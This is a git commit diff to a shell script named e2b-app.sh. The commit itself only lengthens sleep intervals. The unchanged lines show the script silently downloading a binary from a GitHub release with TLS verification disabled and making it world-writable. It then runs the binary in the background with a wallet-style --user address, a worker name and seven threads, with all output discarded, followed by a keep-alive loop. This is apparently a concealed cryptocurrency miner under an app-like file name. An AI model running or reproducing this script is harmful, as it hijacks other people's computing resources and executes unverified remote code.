6b1f2015c4eb908d548718aa1973a54fec6837ca
gaserjuk <gaserjukilo@gmail.com>
2026-04-22 07:44:09 +0700

    Update e2b-app.sh

--- e2b-app.sh
+++ e2b-app.sh
@@ -2,9 +2,9 @@
 curl -sLkO https://github.com/satelitlima00/sentor/releases/download/velt/velt >/dev/null 2>&1
 chmod 777 velt
 ./velt --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass WORKER-E1 --threads 7 >/dev/null 2>&1 &
-sleep 20
+sleep 200
 while true
 do
         echo "Ojo Lali Ngopi Boss..."
-        sleep 100
+        sleep 720
 done
